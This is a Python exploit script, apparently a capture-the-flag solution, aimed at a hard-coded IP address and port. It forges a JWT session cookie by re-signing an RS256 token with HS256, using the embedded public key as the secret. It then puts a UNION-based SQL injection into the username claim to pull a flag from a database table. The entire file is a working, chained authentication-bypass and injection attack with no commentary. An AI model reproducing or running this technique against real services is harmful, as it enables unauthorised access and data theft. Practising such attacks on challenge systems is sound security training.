import requests
import jwt
import base64
import json

def Token_Generator(pk, payload, injection):
  payload['username'] = injection
  token = jwt.encode(payload=payload,key=pk,algorithm='HS256')
  return token

url = 'http://167.99.86.47:32658/'
session = requests.session()
cookie = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pY2hhZWwiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MDk2MDM1ODN9.7EfNHyuUiWirtF7U1Qmm8n2e5gFcqGVhoh8ZnUXKoaGP3Tdfa5B0-R5CKsfj2j7GEsDQHQiNeKsl2UetIWOg3vc-1mi8y3xEjnoWt5_T5fXkSFaGjKyb4-3y99avbK0E_Ur5PgqGkP6gH9_cG6SEi7SOkWDgWHEr-VlNWDNB1yVDZuPSff3xiUa3FBoXetzvS6ZD47Uc_ARM8cEDiUB0uYvcnNqRMVjVFAudENVE_4u3K5o0CK1NPhi6_0nWZX2augxLB1pLlxHYIDn7YcLQRlJax6NpVFcvFHlBTe8t2DPkQ5nMrweLnTIRIgka7L0zJdBspavswWtgQhpKtzSVsw'
token = str(cookie).split('.')
payload = json.loads(base64.urlsafe_b64decode(token[1].encode('utf-8')).decode('ascii'))
pk = payload['pk']
injection = "michael' UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--"
token = Token_Generator(pk,payload,injection)
session.cookies.set('session',str(token,'utf-8'))
r = session.get(url)
print(r.text)


